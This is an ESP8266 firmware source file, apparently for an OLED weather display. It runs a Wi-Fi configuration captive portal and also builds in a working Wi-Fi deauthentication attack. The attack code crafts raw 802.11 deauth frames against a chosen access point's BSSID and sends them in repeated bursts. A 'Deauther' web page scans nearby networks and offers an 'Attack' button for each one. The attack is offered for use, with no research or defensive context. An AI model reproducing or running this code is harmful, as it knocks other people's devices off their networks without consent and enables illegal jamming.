#include "wifi_portal.h"

#include <ArduinoJson.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <LittleFS.h>
#include <time.h>

extern "C" {
#include "user_interface.h"
}

#include "app_state.h"

namespace
{
  constexpr byte DNS_PORT = 53;
  DNSServer dnsServer;

  bool deauthRunning = false;
  uint8_t deauthBssid[6] = {0};
  uint8_t deauthChannel = 1;
  unsigned long lastDeauthBurstMs = 0;
  constexpr unsigned long DEAUTH_BURST_INTERVAL_MS = 100;

  String escapeHtml(const String &value)
  {
    String escaped;

    for (size_t i = 0; i < value.length(); i++)
    {
      char c = value[i];

      if (c == '&')
        escaped += "&amp;";
      else if (c == '<')
        escaped += "&lt;";
      else if (c == '>')
        escaped += "&gt;";
      else if (c == '"')
        escaped += "&quot;";
      else
        escaped += c;
    }

    return escaped;
  }

  bool parseBssid(const String &str, uint8_t *out)
  {
    if (str.length() != 17)
      return false;
    // Verify colons at expected positions
    if (str[2] != ':' || str[5] != ':' || str[8] != ':' || str[11] != ':' || str[14] != ':')
      return false;
    for (int i = 0; i < 6; i++)
    {
      out[i] = (uint8_t)strtoul(str.substring(i * 3, i * 3 + 2).c_str(), nullptr, 16);
    }
    return true;
  }

  void sendDeauthBurst()
  {
    if (!deauthRunning)
      return;
    unsigned long now = millis();
    if (now - lastDeauthBurstMs < DEAUTH_BURST_INTERVAL_MS)
      return;
    lastDeauthBurstMs = now;

    wifi_set_channel(deauthChannel);

    uint8_t packet[26] = {
      // Frame Control: type=Management (00), subtype=Deauth (1100) → 0xC0
      0xc0, 0x00,
      // Duration
      0x00, 0x00,
      // Destination: broadcast
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      // Source (AP BSSID – filled below)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      // BSSID (AP BSSID – filled below)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      // Sequence Control
      0x00, 0x00,
      // Reason Code: 1 = unspecified
      0x01, 0x00
    };

    memcpy(&packet[10], deauthBssid, 6);
    memcpy(&packet[16], deauthBssid, 6);

    for (int i = 0; i < 5; i++)
    {
      wifi_send_pkt_freedom(packet, sizeof(packet), 0);
      delay(1);
    }
  }

  void loadWiFiConfig()
  {
    if (!LittleFS.exists(wifiConfigPath))
    {
      return;
    }

    File file = LittleFS.open(wifiConfigPath, "r");
    if (!file)
    {
      return;
    }

    JsonDocument doc;
    DeserializationError error = deserializeJson(doc, file);
    file.close();

    if (error)
    {
      return;
    }

    wifiSsid = doc["ssid"] | wifiSsid;
    wifiPassword = doc["password"] | wifiPassword;
    weatherUpdateIntervalMs = doc["weather_interval_ms"] | weatherUpdateIntervalMs;
    screenChangeIntervalMs = doc["screen_change_ms"] | screenChangeIntervalMs;
    timezoneOffsetHours = doc["timezone_offset_hours"] | timezoneOffsetHours;
    oledBrightness = doc["oled_brightness"] | oledBrightness;
  }

  bool saveWiFiConfig()
  {
    JsonDocument doc;
    doc["ssid"] = wifiSsid;
    doc["password"] = wifiPassword;
    doc["weather_interval_ms"] = weatherUpdateIntervalMs;
    doc["screen_change_ms"] = screenChangeIntervalMs;
    doc["timezone_offset_hours"] = timezoneOffsetHours;
    doc["oled_brightness"] = oledBrightness;

    File file = LittleFS.open(wifiConfigPath, "w");
    if (!file)
    {
      return false;
    }

    bool ok = serializeJson(doc, file) > 0;
    file.close();
    return ok;
  }

  unsigned long parseULongBounded(const String &raw, unsigned long minValue, unsigned long maxValue, unsigned long fallback)
  {
    if (raw.length() == 0)
    {
      return fallback;
    }

    unsigned long value = strtoul(raw.c_str(), nullptr, 10);
    if (value < minValue)
      return minValue;
    if (value > maxValue)
      return maxValue;
    return value;
  }

  int parseIntBounded(const String &raw, int minValue, int maxValue, int fallback)
  {
    if (raw.length() == 0)
    {
      return fallback;
    }

    long value = strtol(raw.c_str(), nullptr, 10);
    if (value < minValue)
      return minValue;
    if (value > maxValue)
      return maxValue;
    return static_cast<int>(value);
  }

  void applyDisplayAndTimeSettings()
  {
    display.ssd1306_command(SSD1306_SETCONTRAST);
    display.ssd1306_command(oledBrightness);
    configTime(timezoneOffsetHours * 3600, 0, "pool.ntp.org");
  }

  void connectStationWiFi()
  {
    lastConnectAttemptAt = millis();
    WiFi.begin(wifiSsid.c_str(), wifiPassword.c_str());

    unsigned long startedAt = millis();

    while (WiFi.status() != WL_CONNECTED && millis() - startedAt < 15000)
    {
      delay(300);
    }
  }

  String wifiStatusToText(wl_status_t status)
  {
    if (status == WL_CONNECTED)
      return "Conectado";
    if (status == WL_NO_SSID_AVAIL)
      return "SSID nao encontrado";
    if (status == WL_CONNECT_FAILED)
      return "Falha de autenticacao";
    if (status == WL_CONNECTION_LOST)
      return "Conexao perdida";
    if (status == WL_IDLE_STATUS)
      return "Conectando";
    if (status == WL_DISCONNECTED)
      return "Desconectado";
    return "Status desconhecido";
  }

  void startHotspot()
  {
    apSsid = "OLED-" + String(ESP.getChipId(), HEX);

    WiFi.softAPdisconnect(true);
    delay(100);

    bool apStarted = WiFi.softAP(apSsid.c_str(), apPassword, 1, false, 4);

    if (!apStarted)
    {
      WiFi.softAP(apSsid.c_str());
    }

    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  }

  void handleCaptiveRedirect()
  {
    server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString() + "/", true);
    server.send(302, "text/plain", "");
  }

  String buildWifiSelectOptions()
  {
    String options;
    int networkCount = WiFi.scanNetworks();

    if (networkCount <= 0)
    {
      options += "<option value=''>Nenhuma rede encontrada</option>";
      return options;
    }

    for (int i = 0; i < networkCount; i++)
    {
      String ssid = WiFi.SSID(i);
      if (ssid.length() == 0)
      {
        continue;
      }

      int rssi = WiFi.RSSI(i);
      String selected = ssid == wifiSsid ? " selected" : "";
      options += "<option value='" + escapeHtml(ssid) + "'" + selected + ">";
      options += escapeHtml(ssid) + " (" + String(rssi) + " dBm)";
      options += "</option>";
    }

    WiFi.scanDelete();
    return options;
  }

  void handleRoot()
  {
    String wifiOptions = buildWifiSelectOptions();
    wl_status_t staStatus = WiFi.status();
    bool staConnected = staStatus == WL_CONNECTED;

    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;max-width:560px;margin:0 auto;padding:20px}input,select,button{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:0}input,select{background:#222;color:#fff}button{background:#00a6ff;color:#fff;font-weight:bold} .card{background:#1b1b1b;padding:18px;border-radius:16px;margin-bottom:12px} .muted{color:#aaa;font-size:14px} .secondary{background:#2a2a2a} .ok{color:#58d68d}.bad{color:#ff7675}</style></head><body>";
    page += "<div class='card'><h2>Configurar Wi-Fi</h2>";
    page += "<p class='muted'>Conectado ao hotspot: " + apSsid + "</p>";
    page += "<p class='muted'>Status STA: ";
    page += staConnected ? "<span class='ok'>Conectado</span>" : "<span class='bad'>" + wifiStatusToText(staStatus) + "</span>";
    page += "</p>";
    page += "<p class='muted'>IP AP: " + WiFi.softAPIP().toString() + "</p>";
    page += "<p class='muted'>IP STA: ";
    page += staConnected ? WiFi.localIP().toString() : "-";
    page += "</p>";
    page += "<form method='post' action='/save'>";
    page += "<select name='ssid' required>";
    page += wifiOptions;
    page += "</select>";
    page += "<input name='password' placeholder='Senha do Wi-Fi' type='password' value='" + escapeHtml(wifiPassword) + "'>";
    page += "<h3>Ajustes do Sistema</h3>";
    page += "<label>Intervalo do clima (segundos)</label>";
    page += "<input name='weather_sec' type='number' min='10' max='3600' value='" + String(weatherUpdateIntervalMs / 1000) + "'>";
    page += "<label>Fuso horario (UTC, ex: -3)</label>";
    page += "<input name='tz' type='number' min='-12' max='14' value='" + String(timezoneOffsetHours) + "'>";
    page += "<label>Brilho OLED (0-255)</label>";
    page += "<input name='brightness' type='number' min='0' max='255' value='" + String(oledBrightness) + "'>";
    page += "<label>Troca de tela (segundos)</label>";
    page += "<input name='screen_sec' type='number' min='2' max='120' value='" + String(screenChangeIntervalMs / 1000) + "'>";
    page += "<button type='submit'>Salvar e conectar</button></form>";
    page += "<form method='get' action='/'><button class='secondary' type='submit'>Atualizar lista de redes</button></form>";
    page += "<form method='get' action='/status'><button class='secondary' type='submit'>Ver status completo</button></form>";
    page += "<form method='get' action='/deauther'><button class='secondary' type='submit'>Deauther Wi-Fi</button></form>";
    page += "<p class='muted'>API: /api/status</p>";
    page += "</div></body></html>";

    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleStatusPage()
  {
    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<style>body{font-family:Arial,sans-serif;background:#0e0f12;color:#f4f4f4;max-width:620px;margin:0 auto;padding:20px} .card{background:#1a1d23;padding:16px;border-radius:14px;margin:10px 0} .label{color:#9aa4b2;font-size:13px} .value{font-size:18px} .ok{color:#53d769} .bad{color:#ff6b6b} a{color:#7cc7ff} button{width:100%;padding:12px;margin-top:10px;border:0;border-radius:10px;background:#2a2f3a;color:#fff}</style>";
    page += "<script>async function r(){try{const s=await fetch('/api/status');const j=await s.json();document.getElementById('sta').innerText=j.sta_status;document.getElementById('staIp').innerText=j.sta_ip;document.getElementById('ap').innerText=j.ap_ssid;document.getElementById('apIp').innerText=j.ap_ip;document.getElementById('clients').innerText=j.ap_clients;document.getElementById('ssid').innerText=j.saved_ssid;document.getElementById('rssi').innerText=j.rssi;document.getElementById('last').innerText=j.last_connect_attempt_age_ms+' ms';document.getElementById('uptime').innerText=j.uptime_ms+' ms';document.getElementById('temp').innerText=j.temperature_c+' C';document.getElementById('screen').innerText=j.active_screen;}catch(e){}}setInterval(r,2000);window.onload=r;</script></head><body>";
    page += "<h2>Status do Servidor Wi-Fi</h2>";
    page += "<div class='card'><div class='label'>STA Status</div><div class='value' id='sta'>-</div><div class='label'>STA IP</div><div class='value' id='staIp'>-</div><div class='label'>RSSI</div><div class='value' id='rssi'>-</div></div>";
    page += "<div class='card'><div class='label'>AP SSID</div><div class='value' id='ap'>-</div><div class='label'>AP IP</div><div class='value' id='apIp'>-</div><div class='label'>Clientes no AP</div><div class='value' id='clients'>-</div></div>";
    page += "<div class='card'><div class='label'>SSID salvo</div><div class='value' id='ssid'>-</div><div class='label'>Ultima tentativa de conexao</div><div class='value' id='last'>-</div><div class='label'>Uptime</div><div class='value' id='uptime'>-</div><div class='label'>Temperatura</div><div class='value' id='temp'>-</div><div class='label'>Tela ativa</div><div class='value' id='screen'>-</div></div>";
    page += "<button onclick=\"location.href='/'\">Voltar para configuracao</button>";
    page += "<div class='card'><a href='/api/status'>Abrir JSON de status</a></div></body></html>";

    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleStatusJson()
  {
    JsonDocument doc;
    wl_status_t staStatus = WiFi.status();
    bool staConnected = staStatus == WL_CONNECTED;

    doc["sta_status"] = wifiStatusToText(staStatus);
    doc["sta_connected"] = staConnected;
    doc["sta_ip"] = staConnected ? WiFi.localIP().toString() : String("-");
    doc["rssi"] = staConnected ? String(WiFi.RSSI()) + " dBm" : String("-");
    doc["ap_ssid"] = apSsid;
    doc["ap_ip"] = WiFi.softAPIP().toString();
    doc["ap_clients"] = WiFi.softAPgetStationNum();
    doc["saved_ssid"] = wifiSsid;
    doc["last_connect_attempt_ms"] = lastConnectAttemptAt;
    doc["last_connect_attempt_age_ms"] = lastConnectAttemptAt > 0 ? millis() - lastConnectAttemptAt : 0;
    doc["uptime_ms"] = millis();
    doc["temperature_c"] = temp;
    doc["active_screen"] = screen;
    doc["weather_update_interval_ms"] = weatherUpdateIntervalMs;
    doc["screen_change_interval_ms"] = screenChangeIntervalMs;
    doc["timezone_offset_hours"] = timezoneOffsetHours;
    doc["oled_brightness"] = oledBrightness;
    doc["deauth_running"] = deauthRunning;

    String payload;
    serializeJson(doc, payload);
    server.send(200, "application/json; charset=utf-8", payload);
  }

  void handleSave()
  {
    String newSsid = server.arg("ssid");
    String newPassword = server.arg("password");
    unsigned long weatherSec = parseULongBounded(server.arg("weather_sec"), 10, 3600, weatherUpdateIntervalMs / 1000);
    unsigned long screenSec = parseULongBounded(server.arg("screen_sec"), 2, 120, screenChangeIntervalMs / 1000);
    int newTz = parseIntBounded(server.arg("tz"), -12, 14, timezoneOffsetHours);
    int newBrightness = parseIntBounded(server.arg("brightness"), 0, 255, oledBrightness);

    if (newSsid.length() == 0)
    {
      server.send(400, "text/plain; charset=utf-8", "SSID vazio");
      return;
    }

    wifiSsid = newSsid;
    wifiPassword = newPassword;
    weatherUpdateIntervalMs = weatherSec * 1000;
    screenChangeIntervalMs = screenSec * 1000;
    timezoneOffsetHours = newTz;
    oledBrightness = static_cast<uint8_t>(newBrightness);

    applyDisplayAndTimeSettings();
    bool saved = saveWiFiConfig();

    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<meta http-equiv='refresh' content='4;url=/status'>";
    page += "<style>body{font-family:Arial,sans-serif;background:#101216;color:#f4f4f4;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px}.card{background:#1b1f27;padding:22px;border-radius:16px;max-width:460px;width:100%}.ok{color:#53d769}.bad{color:#ff6b6b}.loader{width:18px;height:18px;border-radius:50%;border:3px solid #4f5d75;border-top-color:#fff;display:inline-block;animation:s 1s linear infinite;vertical-align:middle;margin-right:8px}@keyframes s{to{transform:rotate(360deg)}}</style></head><body>";
    page += "<div class='card'><h3>Salvando configuracao</h3>";
    page += "<p>SSID selecionado: <strong>" + escapeHtml(wifiSsid) + "</strong></p>";
    page += saved ? "<p class='ok'>Dados salvos com sucesso.</p>" : "<p class='bad'>Falha ao salvar no armazenamento.</p>";
    page += "<p><span class='loader'></span>Tentando conectar agora...</p>";
    page += "<p>Voce sera redirecionado para a pagina de status em alguns segundos.</p>";
    page += "<p><a href='/status' style='color:#7cc7ff'>Abrir status agora</a></p></div></body></html>";

    server.send(200, "text/html; charset=utf-8", page);

    WiFi.disconnect();
    connectStationWiFi();
  }

  void handleScanAp()
  {
    int n = WiFi.scanNetworks();
    String json = "[";
    for (int i = 0; i < n; i++)
    {
      if (i > 0)
        json += ",";
      uint8_t *bssid = WiFi.BSSID(i);
      char bssidStr[18];
      snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
      JsonDocument entry;
      entry["ssid"] = WiFi.SSID(i);
      entry["bssid"] = bssidStr;
      entry["channel"] = WiFi.channel(i);
      entry["rssi"] = WiFi.RSSI(i);
      String entryStr;
      serializeJson(entry, entryStr);
      json += entryStr;
    }
    json += "]";
    WiFi.scanDelete();
    server.send(200, "application/json; charset=utf-8", json);
  }

  void handleDeauthStart()
  {
    String bssidStr = server.arg("bssid");
    int ch = server.arg("channel").toInt();
    if (ch < 1 || ch > 14)
    {
      server.send(400, "application/json; charset=utf-8", "{\"error\":\"channel must be 1-14\"}");
      return;
    }
    if (!parseBssid(bssidStr, deauthBssid))
    {
      server.send(400, "application/json; charset=utf-8", "{\"error\":\"invalid bssid\"}");
      return;
    }
    deauthChannel = (uint8_t)ch;
    deauthRunning = true;
    lastDeauthBurstMs = 0;
    server.send(200, "application/json; charset=utf-8", "{\"status\":\"started\"}");
  }

  void handleDeauthStop()
  {
    deauthRunning = false;
    server.send(200, "application/json; charset=utf-8", "{\"status\":\"stopped\"}");
  }

  void handleDeautherPage()
  {
    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;max-width:720px;margin:0 auto;padding:20px}";
    page += "button{padding:8px 16px;border-radius:8px;border:0;font-weight:bold;cursor:pointer}";
    page += ".btn-scan{background:#00a6ff;color:#fff} .btn-attack{background:#ff4757;color:#fff} .btn-stop{background:#2ed573;color:#111}";
    page += ".card{background:#1b1b1b;padding:18px;border-radius:16px;margin-bottom:12px}";
    page += "table{width:100%;border-collapse:collapse;margin-top:10px} th,td{padding:8px 10px;text-align:left;border-bottom:1px solid #333}";
    page += "th{color:#aaa;font-size:13px} .status{margin:10px 0;padding:10px;border-radius:8px;background:#222}";
    page += ".running{color:#ff4757} .stopped{color:#aaa}</style>";
    page += "<script>";
    page += "var aps=[];";
    page += "async function scanAps(){";
    page += "  document.getElementById('scanBtn').disabled=true;document.getElementById('scanBtn').innerText='Scanning...';";
    page += "  try{const r=await fetch('/api/scan_ap');aps=await r.json();renderTable();}catch(e){alert('Scan failed');}";
    page += "  document.getElementById('scanBtn').disabled=false;document.getElementById('scanBtn').innerText='Scan';";
    page += "}";
    page += "function renderTable(){";
    page += "  var tb=document.getElementById('apTable');tb.innerHTML='';";
    page += "  aps.forEach(function(ap){";
    page += "    var tr=document.createElement('tr');";
    page += "    tr.innerHTML='<td>'+escHtml(ap.ssid)+'</td><td>'+ap.bssid+'</td><td>'+ap.channel+'</td><td>'+ap.rssi+' dBm</td>'";
    page += "    +'<td><button class=\"btn-attack\" onclick=\"startAttack(\\\"'+ap.bssid+'\\\",'+ap.channel+')\">Attack</button></td>';";
    page += "    tb.appendChild(tr);";
    page += "  });";
    page += "}";
    page += "function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}";
    page += "async function startAttack(bssid,ch){";
    page += "  var fd=new FormData();fd.append('bssid',bssid);fd.append('channel',ch);";
    page += "  await fetch('/api/deauth/start',{method:'POST',body:fd});updateStatus();";
    page += "}";
    page += "async function stopAttack(){await fetch('/api/deauth/stop',{method:'POST'});updateStatus();}";
    page += "async function updateStatus(){";
    page += "  try{const r=await fetch('/api/status');const j=await r.json();";
    page += "  var el=document.getElementById('deauthStatus');";
    page += "  if(j.deauth_running){el.innerHTML='<span class=\"running\">&#9679; Ataque ativo</span>';}";
    page += "  else{el.innerHTML='<span class=\"stopped\">&#9675; Inativo</span>';}";
    page += "  }catch(e){}}";
    page += "setInterval(updateStatus,2000);window.onload=function(){scanAps();updateStatus();};";
    page += "</script></head><body>";
    page += "<div class='card'><h2>Wi-Fi Deauther</h2>";
    page += "<div class='status' id='deauthStatus'><span class='stopped'>&#9675; Inativo</span></div>";
    page += "<button class='btn-scan' id='scanBtn' onclick='scanAps()'>Scan</button>&nbsp;";
    page += "<button class='btn-stop' onclick='stopAttack()'>Stop Attack</button>";
    page += "<table><thead><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>RSSI</th><th>Acao</th></tr></thead>";
    page += "<tbody id='apTable'></tbody></table></div>";
    page += "<div class='card'><button onclick=\"location.href='/'\">Voltar</button></div>";
    page += "</body></html>";
    server.send(200, "text/html; charset=utf-8", page);
  }

  void startConfigPortal()
  {
    server.on("/", HTTP_GET, handleRoot);
    server.on("/generate_204", HTTP_GET, handleCaptiveRedirect);
    server.on("/gen_204", HTTP_GET, handleCaptiveRedirect);
    server.on("/hotspot-detect.html", HTTP_GET, handleCaptiveRedirect);
    server.on("/ncsi.txt", HTTP_GET, handleCaptiveRedirect);
    server.on("/connecttest.txt", HTTP_GET, handleCaptiveRedirect);
    server.on("/fwlink", HTTP_GET, handleCaptiveRedirect);
    server.on("/status", HTTP_GET, handleStatusPage);
    server.on("/api/status", HTTP_GET, handleStatusJson);
    server.on("/save", HTTP_POST, handleSave);
    server.on("/deauther", HTTP_GET, handleDeautherPage);
    server.on("/api/scan_ap", HTTP_GET, handleScanAp);
    server.on("/api/deauth/start", HTTP_POST, handleDeauthStart);
    server.on("/api/deauth/stop", HTTP_POST, handleDeauthStop);
    server.onNotFound(handleCaptiveRedirect);
    server.begin();
  }
} // namespace

void initWiFiAndPortal()
{
  LittleFS.begin();
  loadWiFiConfig();

  WiFi.persistent(false);
  WiFi.mode(WIFI_AP_STA);
  delay(100);

  startHotspot();
  startConfigPortal();
  applyDisplayAndTimeSettings();

  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 10);
  display.println("Conectando WiFi...");
  display.display();

  connectStationWiFi();
}

void handlePortalClient()
{
  server.handleClient();
  dnsServer.processNextRequest();
  sendDeauthBurst();
}
